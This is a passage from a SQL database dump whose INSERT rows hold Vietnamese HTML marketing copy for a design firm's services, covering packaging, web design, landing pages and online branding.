style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Ngo&agrave;i ra bao b&igrave; v&agrave; nh&atilde;n sản phẩm cũng cần cập nhật th&ecirc;m xu hướng&nbsp; thiết kế mới, trong đ&oacute; c&oacute; kiểu chữ, font chữ c&ugrave;ng với m&agrave;u sắc nhằm đ&aacute;p ứng xu thế cũng như thị hiếu kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/E2.jpg\" alt=\"\" width=\"2000\" height=\"882\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">4. Bao b&igrave; phải thể hiện r&otilde; r&agrave;ng th&ocirc;ng tin c&ugrave;ng t&iacute;nh năng sản phẩm</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Một bao b&igrave; sản phẩm chất lượng v&agrave; th&agrave;nh c&ocirc;ng phải đảm bảo thể hiện r&otilde; r&agrave;ng được th&ocirc;ng tin c&ugrave;ng với t&iacute;nh năng sản phẩm, điều n&agrave;y cũng gi&uacute;p n&iacute;u k&eacute;o kh&aacute;ch h&agrave;ng t&igrave;m hiểu v&agrave; kh&aacute;m ph&aacute; sản phẩm tốt hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Trong đ&oacute; bao b&igrave; sản phẩm đẹp&nbsp; cũng cần chứa đầy đủ th&ocirc;ng số, chức năng, th&agrave;nh phần sản phẩm để đảm bảo kh&aacute;ch h&agrave;ng quyết định sử dụng sản phẩm của bạn.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">5. Thường xuy&ecirc;n đổi mới thiết kế bao b&igrave; v&agrave; nh&atilde;n sản phẩm</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Một bao b&igrave; v&agrave; nh&atilde;n sản phẩm th&agrave;nh c&ocirc;ng phải c&oacute; lộ tr&igrave;nh đổi mới v&agrave; cải tiến bao b&igrave; sản phẩm hiệu quả, bởi mỗi thiết kế bao b&igrave; sản phẩm cũng chỉ ph&ugrave; hợp sử dụng trong một khoảng thời gian nhất định, với mục ti&ecirc;u kh&aacute;ch h&agrave;ng nhất định, v&agrave; nếu để qu&aacute; l&acirc;u th&igrave; thương hiệu sẽ dần thu hẹp đối tượng kh&aacute;ch h&agrave;ng của bạn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Ch&iacute;nh v&igrave; vậy việc đổi mới v&agrave; cải tiến bao b&igrave; sản phẩm theo lộ tr&igrave;nh ph&aacute;t triển cũng sẽ gi&uacute;p gia tăng hiệu quả b&aacute;n h&agrave;ng, đưa sản phẩm của bạn tiếp cận được với nhiều đối tượng kh&aacute;ch h&agrave;ng kh&aacute;c nhau một c&aacute;ch hiệu quả nhất.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;<img src=\"http://brity.vn/upload/Vietnam%20Coffee.jpg\" alt=\"\" width=\"2000\" height=\"882\" /></p>', NULL, 1, 0, 56, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 9, '2018-07-12 15:10:31', '', '2018-07-12 08:10:31');
INSERT INTO `news_categories` (`id`, `name`, `name_en`, `alias`, `alias_en`, `photo`, `mota`, `mota_en`, `status`, `lever`, `parent_id`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `com`, `stt`, `created_at`, `background`, `updated_at`) VALUES
(66, 'Thiết kế và phát triển Website', 'Web Design', 'thiet-ke-va-phat-trien-website', 'web-design', '', '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">L&agrave; một trong những dịch vụ cốt l&otilde;i h&agrave;ng đầu của c&aacute;c đơn vị kinh doanh c&ocirc;ng nghệ. Dịch vụ thiết kế website của Brity &nbsp;lu&ocirc;n mang lại cho kh&aacute;ch h&agrave;ng những lợi &iacute;ch tiện dụng nhất với chất lượng web cao, độ SEO&nbsp;tốt, hơn thế nữa ch&uacute;ng t&ocirc;i c&ograve;n c&oacute; hệ thống nh&acirc;n vi&ecirc;n đồ họa cũng thiết kế h&igrave;nh ảnh độc đ&aacute;o theo mong muốn của kh&aacute;ch h&agrave;ng, để kh&aacute;ch h&agrave;ng c&oacute; thể h&agrave;i l&ograve;ng tuyệt đối với chất lượng dịch vụ cũng như chất lượng phục vụ của c&ocirc;ng ty.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Giao diện website</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với chất lượng phục vụ của m&igrave;nh, ch&uacute;ng t&ocirc;i lu&ocirc;n đảm bảo giao diện web được thiết kế theo y&ecirc;u cầu của kh&aacute;c h&agrave;ng, đảm bảo cao nhất về t&iacute;nh ấn tượng cũng như độc đ&aacute;o v&agrave; đặc biệt, thu h&uacute;t nhiều lượng theo d&otilde;i cũng như gi&uacute;p web c&oacute; thể chạy nhanh v&agrave; hiệu quả .</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/09.jpg\" alt=\"\" width=\"1169\" height=\"827\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. C&ocirc;ng nghệ hiện đại</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với dịch vụ của m&igrave;nh, ch&uacute;ng t&ocirc;i c&oacute; c&aacute;c hệ thống website, phần mềm quản l&yacute; tr&ecirc;n cơ&nbsp; sở web do ch&iacute;nh đơn vị đ&oacute; ph&aacute;t triển c&oacute; thể hoạt động tr&ecirc;n nền hệ điều h&agrave;nh Unix/Linus&nbsp; với khả năng bổ sung v&agrave; mở rộng dễ d&agrave;ng, nhanh ch&oacute;ng. Ngo&agrave;i ra th&igrave; ng&ocirc;n ngữ lập tr&igrave;nh được sử dụng ch&iacute;nh l&agrave; &nbsp;PHP ( c&oacute; ưu điểm linh hoạt, an to&agrave;n v&agrave; c&oacute; t&iacute;nh bảo mật cao). Hệ thống web sử dụng sơ sở dữ liệu l&agrave; MySQL</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra c&ograve;n c&oacute; c&aacute;c phần mềm kh&aacute;c như :</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">+&nbsp; Phần mềm quản l&yacute; Webadmin : Những phần mềm n&agrave;y được Brity thiết kế với c&aacute;c c&ocirc;ng cụ nhập liệu r&otilde; r&agrave;ng, tiện &iacute;ch, ph&ugrave; hợp với nhu cầu của c&ocirc;ng ty, đảm bảo c&aacute;c thao t&aacute;c nhập liệu nhanh ch&oacute;ng, dễ sử dụng</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">+ Phần mềm thiết kế web v&agrave; đồ họa: phần mềm xử l&yacute; ảnh, phần mềm ph&aacute;t triển web, phần mềm thiết kế flash, c&ugrave;ng với nhiều &nbsp;phần mềm phụ trợ kh&aacute;c</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Website th&agrave;nh phẩm tương th&iacute;ch với hầu hết c&aacute;c tr&igrave;nh duyệt th&ocirc;ng dụng: IE, Firefox&hellip;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Kỹ thuật template: cho ph&eacute;p chia t&aacute;ch trang web th&agrave;nh 03 phần ri&ecirc;ng biệt: giao diện HTML, m&atilde; lập tr&igrave;nh PHP, v&agrave; cơ sở dữ liệu. Kỹ thuật template gi&uacute;p m&atilde; nguồn website s&aacute;ng sủa, dễ thay đổi bổ sung v&agrave; mở rộng về sau</span></p>\r\n<p style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;3.&nbsp;</span><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tương th&iacute;ch tr&igrave;nh duyệt v&agrave; c&ocirc;ng cụ t&igrave;m kiếm</span></strong></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với hệ thống website được thiết&nbsp;kế ch&uacute;ng t&ocirc;i lu&ocirc;n đảm bảo độ tương th&iacute;ch tối đa nhất với tr&igrave;nh duyệt v&agrave; c&aacute;c c&ocirc;ng cụ t&igrave;m kiếm để c&oacute; thể tối ưu h&oacute;a cao nhất c&aacute;c dịch vụ của kh&aacute;ch h&agrave;ng, gi&uacute;p cho kh&aacute;ch h&agrave;ng c&oacute; thể ho&agrave;n to&agrave;n y&ecirc;n t&acirc;m về c&ocirc;ng cụ t&igrave;m kiếm của m&igrave;nh, quảng b&aacute; sản phẩm của kh&aacute;ch h&agrave;ng một c&aacute;ch hiệu quả nhất, nhanh nhất v&agrave; cao nhất ở tr&ecirc;n mọi tr&igrave;nh duyệt nổi tiếng cũng như tr&ecirc;n tất cả c&aacute;c thanh c&ocirc;ng cụ t&igrave;m kiếm một c&aacute;ch tối đa</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra hệ thống website thiết kế tại Brity lu&ocirc;n đảm bảo được cho kh&aacute;ch h&agrave;ng t&iacute;nh bảo mật tối đa v&agrave; tối ưu h&oacute;a mọi cơ sở dữ liệu, tạo niềm tin tuyệt đối cho kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/10.jpg\" alt=\"\" width=\"1462\" height=\"848\" /></span></p>', NULL, 1, 0, 57, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 11, '2018-07-12 07:57:58', '', '2018-07-12 00:57:58'),
(67, 'Landing Page', 'Web Development', 'landing-page', 'web-development', '', '<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">C&oacute; thể n&oacute;i thiết kế Website Landing Page ch&iacute;nh l&agrave; kh&aacute;i niệm v&ocirc; c&ugrave;ng quen thuộc trong lĩnh vực thiết kế website, đặc biệt với những doanh nghiệp, đơn vị kinh doanh nếu muốn thu h&uacute;t kh&aacute;ch h&agrave;ng, x&acirc;y dựng uy t&iacute;n với người d&ugrave;ng v&agrave; kh&aacute;ch h&agrave;ng th&igrave; việc phải c&oacute; một website đẹp, chuy&ecirc;n nghiệp l&agrave; hết sức cần thiết.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đ&acirc;y cũng l&agrave; l&yacute; do hầu hết c&aacute;c doanh nghiệp c&ugrave;ng c&aacute;c đơn vị kinh doanh đều cần t&igrave;m tới những đơn vị thiết kế Website Landing Page chuy&ecirc;n nghiệp v&agrave; uy t&iacute;n để ho&agrave;n thiện website của m&igrave;nh thu h&uacute;t nhất.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><img src=\"http://brity.vn/upload/13_1.jpg\" alt=\"\" width=\"1000\" height=\"911\" /></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">1. T&igrave;m hiểu sơ lược về website Landing Page</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Website Landing Page thực chất ch&iacute;nh l&agrave; một trang web c&oacute; giao diện c&ugrave;ng nội dung như trang web b&igrave;nh thường, tuy nhi&ecirc;n đơn giản hơn trang web b&igrave;nh thường l&agrave; nội dung của n&oacute; chỉ tập trung v&agrave;o một mảng, kh&iacute;a cạnh nhất định, c&oacute; thể l&agrave; chiến dịch kinh doanh, sản phẩm mới, dịch vụ mới, sự kiện&hellip;.. của doanh nghiệp đ&oacute;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Mục đ&iacute;ch của c&aacute;c trang website Landing Page ch&iacute;nh l&agrave; thu h&uacute;t nhiều lượt xem của kh&aacute;ch h&agrave;ng, k&iacute;ch th&iacute;ch h&agrave;nh vi mua h&agrave;ng của người d&ugrave;ng, th&ocirc;ng qua đ&oacute; người d&ugrave;ng cũng nhận được nhiều th&ocirc;ng tin hơn, l&ocirc;i k&eacute;o người d&ugrave;ng v&agrave;o xem website v&agrave; tạo ấn tượng với người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Để l&agrave;m được điều n&agrave;y th&igrave; việc t&igrave;m một đơn vị thiết kế website Landing Page l&agrave; v&ocirc; c&ugrave;ng cần thiết.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">2. C&oacute; những loại website Landing Page n&agrave;o ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Landing Page th&ocirc;ng thường c&oacute; thể chia ra l&agrave;m nhiều loại kh&aacute;c nhau, d&ugrave; đ&acirc;y cũng chỉ l&agrave; một mục ti&ecirc;u chung hay một h&igrave;nh thức thể hiện, nhưng phong c&aacute;ch thiết kế lại cần tập trung v&agrave;o sự độc đ&aacute;o v&agrave; hấp dẫn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Website Landing Page chủ yếu được chia l&agrave;m c&aacute;c loại sau :</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Website Landing Page c&oacute; dạng khung Pop-up quảng c&aacute;o, loại h&igrave;nh n&agrave;y thưởng mở ra khi người d&ugrave;ng bắt đầu truy cập v&agrave;o trang chủ website mới, y&ecirc;u cầu nhập th&ocirc;ng tin c&aacute; nh&acirc;n, m&atilde; code khuyến mại hoặc tin tức doanh nghiệp</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Website Landing Page c&oacute; dạng Microsite l&agrave; dạng website chỉ c&oacute; 1 trang ri&ecirc;ng, c&oacute; t&ecirc;n miền phụ hoặc t&ecirc;n miền ri&ecirc;ng, nội dung trong trang c&oacute; nhiều nội dung li&ecirc;n quan, c&oacute; link dẫn trực tiếp về website ch&iacute;nh.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/12_3.jpg\" alt=\"\" width=\"1000\" height=\"708\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">3. L&agrave;m sao để thiết kế website Landing Page đẹp v&agrave; chuy&ecirc;n nghiệp</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đối với mỗi đơn vị, doanh nghiệp th&igrave; việc thiết kế một website Landing Page đẹp v&agrave; chuy&ecirc;n nghi&ecirc;p v&ocirc; c&ugrave;ng quan trọng, trong đ&oacute; chủ yếu c&oacute; những phương ph&aacute;p sau m&agrave; bạn c&oacute; thể tham khảo :</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Cần chọn ti&ecirc;u đề hợp l&yacute; cho website Landing Page, trong đ&oacute; ch&uacute;ng ta c&oacute; thể x&acirc;y dựng gi&aacute; trị cụ thể cho người xem khi họ v&agrave;o trang v&agrave; thực hiện h&agrave;nh vi như bạn muốn ( thu thập th&ocirc;ng tin, mua h&agrave;ng, xem th&ocirc;ng tin&hellip;.) từ đ&oacute; gi&uacute;p kh&aacute;ch h&agrave;ng nhận định r&otilde; r&agrave;ng hơn về mục đ&iacute;ch của trang website Landing Page.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Chọn lựa mục ti&ecirc;u, h&agrave;nh động cụ thể của kh&aacute;ch h&agrave;ng m&agrave; bạn mong muốn, trong đ&oacute; ch&uacute;ng ta phải x&aacute;c định r&otilde; r&agrave;ng mục ti&ecirc;u của bản th&acirc;n khi thiết kế website Landing Page, tập trung v&agrave;o mục ti&ecirc;u m&agrave; bạn mong muốn, khuyến kh&iacute;ch h&agrave;nh động đ&oacute; của kh&aacute;ch h&agrave;ng, x&acirc;y dựng cần đảm bảo đơn giản, dễ l&agrave;m để kh&aacute;ch h&agrave;ng c&oacute; thể trải nghiệm website Landing Page th&uacute; vị hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ L&agrave;m mẫu đăng k&yacute; thu h&uacute;t, đơn giản khi thiết kế website Landing Page cũng gi&uacute;p kh&aacute;ch h&agrave;ng dễ thực hiện c&aacute;c thao t&aacute;c hơn, trong đ&oacute; mẫu đăng k&yacute; th&ocirc;ng tin tốt nhất n&ecirc;n tối giản, chỉ cần những th&ocirc;ng tin quan trọng như t&ecirc;n, địa chỉ mail, số điện thoại l&agrave; được.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ X&acirc;y dựng nội dung website Landing Page r&otilde; r&agrave;ng, dễ hiểu, tập trung v&agrave;o nội dung ch&iacute;nh m&agrave; ch&uacute;ng ta cần truyền tải, điều hướng tới người d&ugrave;ng, quan trọng l&agrave; ch&uacute; &yacute; tuyệt đối kh&ocirc;ng được nhồi nh&eacute;t qu&aacute; nhiều lượng th&ocirc;ng tin.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ X&acirc;y dựng video v&agrave; h&igrave;nh ảnh mắt mắt, thu h&uacute;t cũng l&agrave; một ti&ecirc;u ch&iacute; quan trọng để thiết kế website Landing Page th&agrave;nh c&ocirc;ng, trong đ&oacute; những video, h&igrave;nh ảnh n&agrave;y n&ecirc;n tập trung chủ yếu v&agrave;o sản phẩm, c&oacute; thể d&ugrave;ng th&ecirc;m Infographic gi&uacute;p cho website Landing Page của bạn c&agrave;ng th&ecirc;m hấp dẫn v&agrave; hiệu quả nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Để đảm bảo thiết kế website Landing Page của doanh nghiệp kh&aacute;ch h&agrave;ng c&oacute; thể sử dụng c&aacute;c phần mềm, c&ocirc;ng cụ cơ bản tr&ecirc;n internet.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Tuy nhi&ecirc;n nếu kh&aacute;ch h&agrave;ng muốn đảm bảo thiết kế những website Landing Page chuy&ecirc;n nghiệp, đẹp mắt v&agrave; hấp dẫn, thu h&uacute;t người xem th&igrave; c&oacute; thể t&igrave;m tới dịch vụ thiết kế website Landing Page tại GCO ch&uacute;ng t&ocirc;i để nhận được những th&agrave;nh phẩm ho&agrave;n hảo nhất với mức gi&aacute; hợp l&yacute;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">&nbsp;<img src=\"http://brity.vn/upload/13_2.jpg\" alt=\"\" width=\"1000\" height=\"911\" /></span></p>', NULL, 1, 0, 57, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 12, '2018-07-12 08:12:53', '', '2018-07-12 01:12:53'),
(68, 'App Mobile', 'Landing Page', 'app-mobile', 'landing-page', '', NULL, NULL, 1, 0, 57, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 13, '2018-06-15 09:27:00', '', '2018-06-15 02:27:00'),
(70, 'Nhận diện thương hiệu trực tuyến', 'Online branding', 'nhan-dien-thuong-hieu-truc-tuyen', 'online-branding', '', '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Bộ nhận diện thương hiệu trực tuyến l&agrave; to&agrave;n bộ những yếu tố trực tuyến của thương hiệu, đưa h&igrave;nh&nbsp;ảnh to&agrave;n diện của doanh nghiệp l&ecirc;n internet, trong đ&oacute; bao gồm website, ứng dụng banner, ứng dụng nhận diện mạng x&atilde; hội, g&oacute;i bi&ecirc;n tập nội dung website, face book, google adword&hellip;. Đ&acirc;y đều l&agrave; những yếu tố quan trọng gi&uacute;p truyền tải h&igrave;nh ảnh, thương hiệu v&agrave; sản phẩm tới người ti&ecirc;u d&ugrave;ng qua c&aacute;c c&ocirc;ng cụ trực tuyến dễ d&agrave;ng hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đặc biệt với kh&aacute;ch h&agrave;ng sử dụng dịch vụ thiết kế bộ Bộ nhận diện thương hiệu trực tuyến của Brity lu&ocirc;n đảm bảo c&oacute; t&iacute;nh đồng bộ, nhất qu&aacute;n về h&igrave;nh ảnh, mang lại sự chuy&ecirc;n nghiệp cao nhất trong tầm nh&igrave;n của kh&aacute;ch h&agrave;ng.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Tại sao n&ecirc;n thiết kế Bộ nhận diện thương hiệu trực tuyến tại Brity ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Thiết kế Bộ nhận diện thương hiệu trực tuyến tại Brity lu&ocirc;n cam kết mang tới cho kh&aacute;ch h&agrave;ng những th&agrave;nh phẩm ho&agrave;n hảo nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Sử dụng dịch vụ thiết kế Bộ nhận diện thương hiệu trực tuyến tại Brity kh&ocirc;ng chỉ tạo sự chuy&ecirc;n nghiệp cho doanh nghiệp m&agrave; c&ograve;n l&agrave;m n&ecirc;n h&igrave;nh ảnh của doanh nghiệp của bạn, từ đ&oacute; dễ d&agrave;ng thu h&uacute;t kh&aacute;ch h&agrave;ng v&agrave; gia tăng được sự tin tưởng của c&aacute;c nh&agrave; đầu tư, đối t&aacute;c cũng như kh&aacute;ch h&agrave;ng của bạn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Một bộ nhận diện thương hiệu trực tuyến tốt cũng gi&uacute;p người d&ugrave;ng dễ d&agrave;ng ghi nhớ thương hiệu hơn tr&ecirc;n internet, từ đ&oacute; nhận định v&agrave; ph&acirc;n biệt được sự nổi bật trong ng&agrave;nh m&agrave; doanh nghiệp của bạn đang hoạt động, tạo dựng quy m&ocirc; cho c&ocirc;ng ty để thu h&uacute;t nh&agrave; đầu tư dễ d&agrave;ng hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Bộ nhận diện thương hiệu trực tuyến cũng gi&uacute;p x&aacute;c định lĩnh vực kinh doanh của bạn trong mắt người ti&ecirc;u d&ugrave;ng, đảm bảo đ&aacute;p ứng ti&ecirc;u chuẩn ng&agrave;nh v&agrave; ti&ecirc;u chuẩn kinh doanh tốt nhất.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/14.jpg\" alt=\"\" width=\"1920\" height=\"1000\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Bộ nhận diện thương hiệu trực tuyến bao gồm những g&igrave; ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Bộ nhận diện thương hiệu trực quan đầy đủ của doanh nghiệp bao gồm</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Website c&ocirc;ng ty</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Website thương hiệu / sản phẩm</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ứng dụng banner quảng c&aacute;o tr&ecirc;n internet</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ứng dụng nhận diện tr&ecirc;n mạng x&atilde; hội</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">G&oacute;i bi&ecirc;n tập nội dung website</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Google Adwords</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Facebook marketing</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">G&oacute;i tư vấn tổng thể về content marketing</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra c&ograve;n nhiều mảng kh&aacute;c trong bộ nhận diện thương hiệu trực tuyến t&ugrave;y theo từng quy m&ocirc; v&agrave; hoạt động của doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/15.jpg\" alt=\"\" width=\"1920\" height=\"1000\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">3. Thiết kế bộ nhận diện thương hiệu trực tuyến tại Brity</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Nếu bạn đang t&igrave;m kiếm một bộ nhận diện thương hiệu trực tuyến ho&agrave;n hảo c&oacute; thể t&igrave;m tới Brity l&agrave;m đơn vị thiết kế nhận diện thương hiệu trực tuyến s&aacute;ng tạo v&agrave; chất lượng cho doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">L&agrave; một đơn vị c&oacute; chuy&ecirc;n m&ocirc;n cao trong thiết kế nhận diện thương hiệu trực tuyến, Brity sở hữu đội&nbsp; ngũ thiết kế chuy&ecirc;n nghiệp, s&aacute;ng tạo gi&uacute;p thể hiện được t&iacute;nh c&aacute;ch, gi&aacute; trị v&agrave; đặc điểm của thương hiệu, từ đ&oacute; tạo ra một gi&aacute; trị bản sắc ri&ecirc;ng cho thương hiệu đ&oacute;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để thiết kế ứng dụng thương hiệu mang phong c&aacute;ch ri&ecirc;ng ấn tượng v&agrave; độc đ&aacute;o cho doanh nghiệp của bạn, kh&aacute;ch h&agrave;ng c&oacute; thể t&igrave;m tới dịch vụ thiết kế ứng dụng thương hiệu tại Brity ch&uacute;ng t&ocirc;i. Tại đ&acirc;y ch&uacute;ng t&ocirc;i c&oacute; đầy đủ mọi chuy&ecirc;n gia trong lĩnh vực thiết kế v&agrave; x&acirc;y dựng thương hiệu, c&oacute; kinh nghiệm l&acirc;u năm trong lĩnh vực thiết kế quảng c&aacute;o, truyền th&ocirc;ng tiếp thị tại Việt Nam, đảm bảo mang tới cho kh&aacute;ch h&agrave;ng đ&uacute;ng điều m&agrave; bạn đang cần.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/16.jpg\" alt=\"\" width=\"1501\" height=\"1001\" /></span></p>', NULL, 1, 0, 57, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 14, '2018-07-12 08:32:29', '', '2018-07-12 01:32:29'),
